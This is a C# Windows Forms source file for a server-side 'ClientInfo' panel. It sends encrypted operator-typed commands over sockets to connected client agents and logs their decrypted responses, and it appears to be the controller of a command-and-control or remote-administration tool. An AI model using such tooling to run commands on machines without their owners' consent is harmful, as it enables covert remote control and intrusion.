using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server_side
{
    public partial class ClientInfo : Form
    {
        public ClientInfo(string clientIP, string clientHostname, string connectTime, string clientOS)
        {
            InitializeComponent();
            ipLabel.Text = clientIP;
            hostnameLabel.Text = clientHostname;
            contimeLabel.Text = connectTime;
            osLabel.Text = clientOS;
        }

        private void sendCommandBtn_Click(object sender, EventArgs e)
        {
            string delimiter = "|;|";
            string command = $"1{delimiter}{commandBox.Text}";
            string clientIP = ipLabel.Text;

            var client = NetworkLayer.clientList.SelectMany(dict => dict)
                .Where(kvp => kvp.Key.RemoteEndPoint.ToString().Contains(clientIP))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);
            if (client.Count == 0)
            {
                MessageBox.Show("Client not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            Socket socket = client.Keys.First();
            string passPhrase = client.Values.First();
            passLabel.Text = passPhrase;

            Encryptor encryptor = new(passPhrase.Trim());            
            keyLabel.Text = encryptor.GetKey();
            ivLabel.Text = encryptor.GetIV();

            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
            NetworkLayer.Send(socket, encryptedCommand);

            logging("Command sent: " + commandBox.Text);

            // Receive response
            byte[] response = NetworkLayer.ReceiveResult(socket);
            string decryptedResponse = encryptor.Decrypt(response);
            logging("Response received: " + decryptedResponse);

            commandBox.Text = "";
        }

        private void logging(string log)
        {
            agentLogBox.AppendText(log + Environment.NewLine);
        }
    }

}
